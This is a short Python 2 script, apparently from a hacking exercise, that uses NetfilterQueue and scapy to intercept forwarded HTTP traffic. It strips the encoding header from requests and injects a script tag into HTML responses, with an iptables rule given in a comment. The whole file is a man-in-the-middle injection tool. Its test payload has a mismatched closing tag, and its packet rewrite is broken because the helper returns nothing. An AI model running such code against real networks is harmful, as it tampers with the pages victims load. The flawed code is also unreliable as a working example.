import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print "[+] Request"
	    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
	    
        elif scapy_packet[scapy.TCP].sport == 80:
            print "[+] Responce"
            injection_code = "<script>alert('test')</test>"
            load = load.replace("</body>", injection_code +"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

    
queue = NetfilterQueue()
queue.bind(0, process_packet)#we bind to a queue this time is the 0 queue
#queues can be made using iptables like so: iptables -I FORWARD -j NFQUEUE --queue-num 0
queue.run()
